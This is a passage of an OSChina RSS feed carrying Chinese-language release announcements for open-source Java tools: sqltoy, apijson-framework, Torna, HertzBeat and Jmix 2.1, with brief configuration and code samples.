margin-left:0; margin-right:0; text-align:left"><strong>sqltoy 特点介绍：</strong></p><ul><li><strong>sqltoy 的核心构建思想</strong></li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:start"><img alt="" height="868" src="https://oscimg.oschina.net/oscnet/up-a385d72ceb030d705e8e5803ca3cd4c09a1.png" width="1136" referrerpolicy="no-referrer"></p><ul><li><strong>sqltoy 的对比 mybatis (plus) 的核心点：查询语句编写、可阅读性、可维护性</strong></li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" height="923" src="https://oscimg.oschina.net/oscnet/up-05295a7a1813978134a5e49a7cff0f0e1ab.png" width="1873" referrerpolicy="no-referrer"></p><ul><li><strong>对象化 crud 是基础，但 sqltoy 有针对性的改进：update、updateSaveFetch、updateFetch 等</strong></li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:start"><img alt="" height="845" src="https://oscimg.oschina.net/oscnet/up-6b8e8204061eec3d2096a50e9899548351e.png" width="1745" referrerpolicy="no-referrer"></p><ul><li><strong>sqltoy 的缓存翻译，大幅减少表关联简化 sql，让你的查询性能成几何级提升</strong></li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="阐述 sqltoy 为什么秒杀 mybatis(plus)" src="https://p3-tt.byteimg.com/origin/pgc-image/85287e14aa3e428fbabe297472596455?from=pc" referrerpolicy="no-referrer"></p><ul><li><strong>极致的分页，同样帮助你实现查询的性能大幅提升</strong></li></ul><ol><li>快速分页:@fast () 实现先取单页数据然后再关联查询，极大提升速度</li><li>分页优化器:page-optimize 让分页查询由两次变成 1.3~1.5 次 (用缓存实现相同查询条件的总记录数量在一定周期内无需重复查询</li><li>sqltoy 的分页取总记录的过程不是简单的 select count (1) from (原始 sql)；而是智能判断是否变成:select count (1) from 'from 后语句 '， 并自动剔除最外层的 order by</li><li>sqltoy 支持并行查询：parallel="true"，同时查询总记录数和单页数据，大幅提升性能</li></ol><div><img alt="阐述 sqltoy 为什么秒杀 mybatis(plus)" src="https://p6-tt.byteimg.com/origin/pgc-image/3d5f7094da154671985dd390f56f6302?from=pc" referrerpolicy="no-referrer"></div><div>
 &nbsp;
</div><ul><li><strong>便利的跨数据库统计计算：数据旋转</strong></li></ul><div><img alt="阐述 sqltoy 为什么秒杀 mybatis(plus)" src="https://p1-tt.byteimg.com/origin/pgc-image/949bc75b5c53441c98284dae2bed11fe?from=pc" referrerpolicy="no-referrer"></div><ul><li><strong>便利的跨数据库统计计算：无限极分组统计 (含汇总求平均)</strong></li></ul><div><img alt="阐述 sqltoy 为什么秒杀 mybatis(plus)" src="https://p1-tt.byteimg.com/origin/pgc-image/f5edc52adbbe4a1ca327d9a9b0c5d64c?from=pc" referrerpolicy="no-referrer"></div><ul><li><strong>便利的跨数据库统计计算：同比环比</strong></li></ul><div><img alt="阐述 sqltoy 为什么秒杀 mybatis(plus)" src="https://p3-tt.byteimg.com/origin/pgc-image/b9d435e2852644c9a4c9e062cc3d46d7?from=pc" referrerpolicy="no-referrer"></div><div>
 5、树形表排序汇总
</div><div><p style="margin-left:0; margin-right:0"><img height="274" src="https://oscimg.oschina.net/oscnet/up-1773cce82b98a943d42caaa62f60d80f3d0.png" width="1002" referrerpolicy="no-referrer"></p><p style="margin-left:0; margin-right:0"><img height="403" src="https://oscimg.oschina.net/oscnet/up-8717f1c442767b08f2406019ae9b63721cb.png" width="409" referrerpolicy="no-referrer"></p><p style="margin-left:0; margin-right:0">6、扩展集成</p><p style="margin-left:0; margin-right:0"><img height="961" src="https://oscimg.oschina.net/oscnet/up-6603ed15ec936dea45c4f6fb7318f4a062b.png" width="1965" referrerpolicy="no-referrer"></p></div></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 02:12:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276401/sqltoy-orm-5-2-91-released</guid>
            <link>https://www.oschina.net/news/276401/sqltoy-orm-5-2-91-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[apijson-framework 6.3.0 发布，腾讯 APIJSON 框架•简化使用•单元测试]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p style="color:#24292f; text-align:start"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F5738175%2F167259883-e5fff2f4-b3e8-4b2f-a597-d851004c3393.png" target="_blank"><img alt="image" src="https://user-images.githubusercontent.com/5738175/167259883-e5fff2f4-b3e8-4b2f-a597-d851004c3393.png" referrerpolicy="no-referrer"></a></p><p style="color:#24292f; text-align:start"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F5738175%2F167259922-f343683f-6335-4778-aaeb-d1b9aed999dc.png" target="_blank"><img alt="image" src="https://user-images.githubusercontent.com/5738175/167259922-f343683f-6335-4778-aaeb-d1b9aed999dc.png" referrerpolicy="no-referrer"></a></p><p><strong>apijson-framework 6.3.0 更新内容</strong></p><div><span>升级 APIJSON, apijson-column, 自身，版本分别为 6.3.0, 1.8.0, 6.3.0</span>；
</div><div>
 &nbsp;
</div><p>具体见&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2FAPIJSON%2Fapijson-framework%2Freleases" target="_blank">Release 发布版本</a></p><h1>apijson-framework<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fjitpack.io%2F%23APIJSON%2Fapijson-framework" target="_blank"><img alt="" src="https://camo.githubusercontent.com/c57c7f9597dc1ffa6ce744940032c820ec2092100812c13e8018569d6692e18e/68747470733a2f2f6a69747061636b2e696f2f762f4150494a534f4e2f6170696a736f6e2d6672616d65776f726b2e737667" referrerpolicy="no-referrer"></a></h1><p style="color:#24292f; text-align:start">腾讯<span>&nbsp;</span><a href="https://gitee.com/Tencent/APIJSON">APIJSON</a><span>&nbsp;</span>服务端框架，通过数据库表配置角色权限、参数校验等，简化使用。</p><h2>使用</h2><h4>Access:<span>&nbsp;</span><a href="https://gitee.com/Tencent/APIJSON/blob/master/APIJSONORM/src/main/java/apijson/MethodAccess.java">https://gitee.com/Tencent/APIJSON/blob/master/APIJSONORM/src/main/java/apijson/MethodAccess.java</a></h4><p style="color:#24292f; text-align:start"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F5738175%2F167259883-e5fff2f4-b3e8-4b2f-a597-d851004c3393.png" target="_blank"><img alt="image" src="https://user-images.githubusercontent.com/5738175/167259883-e5fff2f4-b3e8-4b2f-a597-d851004c3393.png" referrerpolicy="no-referrer"></a></p><p style="color:#24292f; text-align:start"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F5738175%2F167261523-59abf4ba-e211-49f9-92bd-a79384bb757f.png" target="_blank"><img alt="image" src="https://user-images.githubusercontent.com/5738175/167261523-59abf4ba-e211-49f9-92bd-a79384bb757f.png" referrerpolicy="no-referrer"></a></p><h4>Request:<span>&nbsp;</span><a href="https://gitee.com/Tencent/APIJSON/blob/master/APIJSONORM/src/main/java/apijson/orm/Operation.java">https://gitee.com/Tencent/APIJSON/blob/master/APIJSONORM/src/main/java/apijson/orm/Operation.java</a></h4><p style="color:#24292f; text-align:start"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F5738175%2F167259922-f343683f-6335-4778-aaeb-d1b9aed999dc.png" target="_blank"><img alt="image" src="https://user-images.githubusercontent.com/5738175/167259922-f343683f-6335-4778-aaeb-d1b9aed999dc.png" referrerpolicy="no-referrer"></a></p><p style="color:#24292f; text-align:start"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F5738175%2F167262762-2c2a1c58-e7bf-4352-a7b9-fcbb0fa67f7f.png" target="_blank"><img alt="image" src="https://user-images.githubusercontent.com/5738175/167262762-2c2a1c58-e7bf-4352-a7b9-fcbb0fa67f7f.png" referrerpolicy="no-referrer"></a></p><p>&nbsp;</p><p>使用 UnitAuto 实现零代码单元测试，具体见</p><p><a href="https://gitee.com/TommyLemon/UnitAuto">https://gitee.com/TommyLemon/UnitAuto</a></p><p><img src="https://raw.githubusercontent.com/TommyLemon/StaticResources/master/UnitAuto/UnitAuto-RandomTest-Parent-small.jpg" referrerpolicy="no-referrer"></p><p>&nbsp;</p><p><a href="https://gitee.com/APIJSON/apijson-framework">https://gitee.com/APIJSON/apijson-framework</a></p><p>创作不易，右上角点 ⭐Star 支持下吧 ^_^</p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 01:49:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276396/apijson-framework-6-3-0-released</guid>
            <link>https://www.oschina.net/news/276396/apijson-framework-6-3-0-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[Torna 1.26.0 发布，接口文档解决方案]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p>Torna 1.26.0 发布，本次发布内容如下：</p><ul><li>【新增】支持对接 MeterSphere，将文档推送到 MeterSphere 中。需要在管理后台开启</li><li>【新增】推送文档后创建一个默认的 mock 请求</li><li>【修复】Nginx 反向代理不支持 basic auth<span>&nbsp;</span><a href="https://gitee.com/durcframework/torna/issues/I8QA6G">#I8QA6G</a></li><li>【修复】修复请求接口后响应信息太长时出现双滚动条<span>&nbsp;</span><a href="https://gitee.com/durcframework/torna/pulls/51" target="_blank">pr</a></li><li>【优化】文档显示，描述列中使用字典类型，显示过窄，未能自适应<span>&nbsp;</span><a href="https://gitee.com/durcframework/torna/issues/I8Q0F3">#I8Q0F3</a></li><li>【优化】请求脚本新增 sys.send，用来手动调用</li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>关于 Torna</strong></p><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">接口文档解决方案，目标是让接口文档管理变得更加方便、快捷。Torna 采用团队协作的方式管理和维护接口文档，将不同形式的文档纳入进来统一维护。</p><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">Torna 弥补了传统文档生成工具（如 swagger）的不如之处，在保持原有功能的前提下丰富并增强了一些实用的功能。</p><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">&nbsp;</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" src="https://oscimg.oschina.net/oscnet/up-47d91305f6b4e40f648ded1c23a50e3515c.png" referrerpolicy="no-referrer"></p><h2>解决文档管理痛点</h2><ul><li>不满足 swagger 文档预览页面和调试页面的展现方式</li><li>不喜欢 swagger 这种侵入式注解</li><li>希望使用 javadoc 注释生成文档，并进行接口调试</li><li>希望把公司所有项目接口文档进行统一管理</li><li>希望把项目中的若干文档提供给第三方调用者查看</li><li>希望可以统一管理项目中的字典枚举</li></ul><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">如果您有以上几个需求和痛点，或许可以尝试一下使用 Torna</p><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftorna.cn%2Ftutorial%2Fstart.html" target="_blank">快速开始</a></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>推荐组合</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>smart-doc + Torna 实现文档全流程自动化</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">如果您使用 Java 语言，推荐使用<span><span>&nbsp;</span></span><code>smart-doc + Torna</code></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><a href="https://gitee.com/smart-doc-team/smart-doc">smart-doc</a><span>&nbsp;</span>+ Torna 组成行业领先的文档生成和管理解决方案，使用 smart-doc 无侵入完成 Java 源代码和注释提取生成 API 文档，自动将文档推送到 Torna 企业级接口文档管理平台。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">通过这套组合您可以实现：只需要写完 Java 注释就能把接口信息推送到 Torna 平台，从而实现接口预览、接口调试。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">推送的内容有：<code>接口名称/author/Path 参数/Header/请求参数/返回参数/字典列表/公共错误码</code></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">如果您是非 Java 语言，可以使用表单页面编辑以上内容，完成后同样可以进行接口预览、调试。</p><p><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftorna.cn%2Ftutorial%2Fstart.html" target="_blank">快速开始→</a></p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 00:58:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276391/torna-1-26-0-released</guid>
            <link>https://www.oschina.net/news/276391/torna-1-26-0-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[HertzBeat 1.4.4 新版本发布，支持监控 Nginx，Websocket 等]]>
            </title>
            <description>
                <![CDATA[<div class="content"><h4>大家好，又到了一月一版的时间点，这应该是过年前的最后一个版本，很高兴 HertzBeat 的最新版本 1.4.4 发布啦!</h4><h3>1.4.4 版本​更新简述如下：</h3><p><strong>新增了对 SNMP V3 版本协议的支持</strong></p><p><strong>支持对 Nginx, NebulaGraph, Pop3, Memcached, Hive, DNS, WebSockets, NTP, SMTP 等等一系列新的监控类型。</strong></p><p><strong>修复了大量 BUG 和文档完善，更多特性欢迎使用探索！</strong></p><ul><li>support snmp v3 monitoring protocol @TJxiaobao</li><li>support monitoring NebulaGraph metrics @ZY945</li><li>support monitoring pop3 metrics @a-little-fool</li><li>support monitoring memcached metrics @ZY945</li><li>support monitoring nginx metrics @a-little-fool</li><li>support monitoring hive metrics @a-little-fool</li><li>feature: support for dns monitoring by @Calvin979</li><li>monitoring the availability of websockets through handshake. by @ZY945</li><li>add ntp protocol and support ntp monitoring by @ZY945</li><li>add smtp protocol and support smtp monitoring by @ZY945</li><li>more feature, document and bugfix</li></ul><h3>什么是 HertzBeat?</h3><p><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdromara%2Fhertzbeat" target="_blank">HertzBeat 赫兹跳动</a> 是一个拥有强大自定义监控能力，高性能集群，兼容 Prometheus，无需 Agent 的开源实时监控告警系统。</p><h3>特点</h3><ul><li>集 <strong>监控+告警+通知</strong> 为一体，支持对应用服务，应用程序，数据库，缓存，操作系统，大数据，中间件，Web 服务器，云原生，网络，自定义等监控阈值告警通知一步到位。</li><li>易用友好，无需 <code>Agent</code>，全 <code>WEB</code> 页面操作，鼠标点一点就能监控告警，零上手学习成本。</li><li>将 <code>Http, Jmx, Ssh, Snmp, Jdbc, Prometheus</code> 等协议规范可配置化，只需在浏览器配置监控模版 <code>YML</code> 就能使用这些协议去自定义采集想要的指标。您相信只需配置下就能立刻适配一款 <code>K8s</code> 或 <code>Docker</code> 等新的监控类型吗？</li><li>兼容 <code>Prometheus</code> 的系统生态并且更多，只需页面操作就可以监控 <code>Prometheus</code> 所能监控的。</li><li>高性能，支持多采集器集群横向扩展，支持多隔离网络监控，云边协同。</li><li>自由的告警阈值规则，<code>邮件</code><code>Discord</code><code>Slack</code><code>Telegram</code><code>钉钉</code><code>微信</code><code>飞书</code><code>短信</code><code>Webhook</code><code>Server 酱</code> 等方式消息及时送达。</li></ul><p><strong>Github: <a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdromara%2Fhertzbeat" target="_blank">https://github.com/dromara/hertzbeat</a></strong></p><p><strong>Gitee: <a href="https://gitee.com/dromara/hertzbeat">https://gitee.com/dromara/hertzbeat</a></strong></p><h3>尝试部署</h3><ol><li><code>docker</code> 环境仅需一条命令即可开始</li></ol><p><code>docker run -d -p 1157:1157 -p 1158:1158 --name hertzbeat tancloud/hertzbeat</code></p><hr><h3>更新日志</h3><p>&gt; 欢迎探索更多，感谢社区小伙伴们的辛苦贡献, 笔芯 💗!</p><p><strong>Full Changelog</strong><span>: </span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdromara%2Fhertzbeat%2Fcompare%2Fv1.4.3...v1.4.4" target="_blank">https://github.com/dromara/hertzbeat/compare/v1.4.3...v1.4.4</a></p><p>&gt; 欢迎来 <strong>Star</strong> 支持一波哦！</p><p><strong>Github: <a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdromara%2Fhertzbeat" target="_blank">https://github.com/dromara/hertzbeat</a></strong></p><p><strong>Gitee: <a href="https://gitee.com/dromara/hertzbeat">https://gitee.com/dromara/hertzbeat</a></strong></p><p><strong>Discord: <a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdiscord.gg%2FeaDqCXgy" target="_blank">https://discord.gg/eaDqCXgy</a></strong></p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 00:52:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276390/hertzbeat-1-4-4-released</guid>
            <link>https://www.oschina.net/news/276390/hertzbeat-1-4-4-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[Jmix 2.1 发布 - 企业级 Web 快速开发框架]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p>&nbsp;</p><p><img alt="Jmix2.1 发布" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/2.1cover.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">我们最近发布了 Jmix 的 2.1 版本。下面我们将介绍这个新版本中增加的新功能和改进。</p><p style="color:black; margin-left:0; margin-right:0">有关完整的详细信息和升级说明，请参阅官方文档中的<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdocs.jmix.cn%2Fjmix%2Fwhats-new%2Findex.html" target="_blank">最近更新</a>页面。</p><h2><span style="color:#fe8a34">新的扩展组件</span></h2><p style="color:black; margin-left:0; margin-right:0">我们将一些之前在 Jmix v.1 中基于经典 UI 的扩展组件迁移了过来。Jmix 2.1 中也能很容易集成这些组件，并且基于 Vaadin 24 提供的现代 Flow UI。</p><h3><span>地图</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>地图</strong>扩展组件已经能支持 Jmix 2+，且具有新的 API，Studio 也能提供出色的支持。</p><p style="color:black; margin-left:0; margin-right:0">下面的示例演示了如何在指定位置显示一个地图标记的 OpenStreetMap：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">maps:geoMap</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"map"</span>&nbsp;<span style="color:#836c28">width</span>=<span style="color:#c41a16">"100%"</span>&nbsp;<span style="color:#836c28">height</span>=<span style="color:#c41a16">"100%"</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">maps:layers</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">maps:tile</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">maps:osmSource</span>/&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">maps:tile</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">maps:vector</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"pointsLayer"</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">maps:vectorSource</span>/&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">maps:vector</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">maps:layers</span>&gt;</span>&nbsp;&nbsp;
<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">maps:geoMap</span>&gt;</span></code></pre><pre><code><span style="color:#643820">@ViewComponent</span>&nbsp;&nbsp;
<span style="color:#aa0d91">private</span>&nbsp;GeoMap&nbsp;map;

<span style="color:#643820">@Subscribe</span>&nbsp;&nbsp;
<span><span style="color:#aa0d91">public</span>&nbsp;<span style="color:#aa0d91">void</span>&nbsp;<span style="color:#1c00cf">onInit</span><span style="color:#5c2699">(InitEvent&nbsp;event)</span>&nbsp;</span>{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;VectorLayer&nbsp;vectorLayer&nbsp;=&nbsp;map.getLayer(<span style="color:#c41a16">"pointsLayer"</span>);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;VectorSource&nbsp;vectorSource&nbsp;=&nbsp;vectorLayer.getSource();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;vectorSource.addFeature(<span style="color:#aa0d91">new</span>&nbsp;MarkerFeature(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GeometryUtils.createPoint(<span style="color:#1c00cf">12.496176</span>,&nbsp;<span style="color:#1c00cf">41.902695</span>)));&nbsp;&nbsp;
}
</code></pre><p><img alt="地图组件" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/maps_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">这个示例属于 「hello world」 级别，显然没有涵盖组件的所有功能。事实上，地图可以包含瓦片层、图像层和矢量层，每个图层都支持不同的数据供应商。可以显示标记、点、折线和多边形。该组件的工作尚未完成，我们将在下一个版本中提供更多功能。</p><h3><span>动态属性</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>动态属性</strong> 扩展组件支持在运行时为实体定义新的属性，而无需修改数据库结构和重启应用程序。这些动态属性可以拆分为不同的类别。</p><p style="color:black; margin-left:0; margin-right:0">例如，Book 实体可以分为两类：<em>电子</em>和<em>纸质</em>。电子书具有「可用格式」和「文件大小」属性，而纸质书具有「封面类型」、「重量」和「尺寸」属性。可以在应用程序 UI 中定义动态属性：</p><p><img alt="动态属性 1" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/dyn_attr_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">在配置了属性之后，用户可以在已有的视图中查看并输入属性值：</p><p><img alt="动态属性 2" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/dyn_attr_2.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">动态属性会自动显示在特殊的 <code>dynamicAttributesPanel</code> 组件（如上所示）或任何现有的 <code>formLayout</code> 和 <code>dataGrid</code> 中。</p><h3><span>通知组件</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>通知</strong>组件支持向用户发送应用内通知或电子邮件通知。可以通过 API 或使用附加组件提供的视图发送通知：</p><p><img alt="通知组件 1" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/notifications_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">应用程序的 UI 需要包含 <code>notificationsIndicator</code> 组件，例如在 <code>main-view.xml</code> 中：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">appLayout</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">navigationBar</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">header</span>&nbsp;<span style="color:#836c28">...</span>&gt;</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">ntf:notificationsIndicator</span>&nbsp;<span style="color:#836c28">classNames</span>=<span style="color:#c41a16">"ms-auto&nbsp;me-m"</span>/&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">header</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">navigationBar</span>&gt;</span></code></pre><p style="color:black; margin-left:0; margin-right:0">然后，收件人能在指示标记看到未读通知的数量，并通过简洁的 UI 直接打开：</p><p><img alt="Alt text" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/notifications_2.png" referrerpolicy="no-referrer"></p><h3><span>搜索组件</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>搜索</strong> 扩展组件支持与 ElasticSearch 进行集成，为应用程序中的数据和上传文件提供全文搜索功能。通过几个简单的步骤就能使用该组件：</p><p style="color:black; margin-left:0; margin-right:0">定义 ElasticSearch 的连接：</p><pre><code>jmix.search.elasticsearch.url = http://localhost:9200
</code></pre><p style="color:black; margin-left:0; margin-right:0">创建一个带注解的 Java 接口，用于定义哪些内容需要进行索引：</p><pre><code><span style="color:#643820">@JmixEntitySearchIndex</span>(entity&nbsp;=&nbsp;Book<span>.<span style="color:#aa0d91">class</span>)&nbsp;&nbsp;
<span style="color:#5c2699">public</span>&nbsp;<span style="color:#5c2699">interface</span>&nbsp;<span style="color:#5c2699">BookIndexDef</span>&nbsp;</span>{&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@AutoMappedField</span>(includeProperties&nbsp;=&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<span style="color:#c41a16">"title"</span>,&nbsp;<span style="color:#c41a16">"author"</span>,&nbsp;<span style="color:#c41a16">"publisher"</span>,&nbsp;<span style="color:#c41a16">"genre.name"</span>})&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span><span style="color:#aa0d91">void</span>&nbsp;<span style="color:#1c00cf">bookMapping</span><span style="color:#5c2699">()</span></span>;&nbsp;&nbsp;
}
</code></pre><p style="color:black; margin-left:0; margin-right:0">在应用程序 UI 中添加 <code>searchField</code> 组件：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">drawerLayout</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">section</span>&nbsp;<span style="color:#836c28">...</span>&gt;</span>
&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">search:searchField</span>/&gt;</span></code></pre><p style="color:black; margin-left:0; margin-right:0">这样就可以了。系统将为 Book 实体的数据自动创建索引（并在每次变动时重新索引），用户能使用索引进行全文搜索：</p><p><img alt="搜索组件" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/search_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">搜索结果会根据当前用户的数据访问权限自动过滤，消除任何信息泄露的风险。</p><h3><span>WebDAV</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>WebDAV</strong> 扩展组件通过 WebDAV 协议提供对文件存储中文件的访问。用户可以使用桌面应用程序（Word、Excel、LibreOffice 等）无缝打开和编辑文件，而无需从应用程序进行上传和下载的操作。在 UI 层，组件提供了一个特殊的上传控件和管理页面，用于管理文件及其版本：</p><p><img alt="WebDAV" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/webdav_1.png" referrerpolicy="no-referrer"></p><h3><span>批量编辑器</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>批量编辑器</strong> 扩展组件支持用户一次更改多个实体实例的属性值，并提供了一个可以添加到任何 <code>dataGrid</code> 的操作：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">dataGrid</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"booksDataGrid"</span>&nbsp;<span style="color:#836c28">...</span>&gt;</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">actions</span>&gt;</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">action</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"bulkEdit"</span>&nbsp;<span style="color:#836c28">type</span>=<span style="color:#c41a16">"bulked_edit"</span>/&gt;</span>&nbsp;&nbsp;
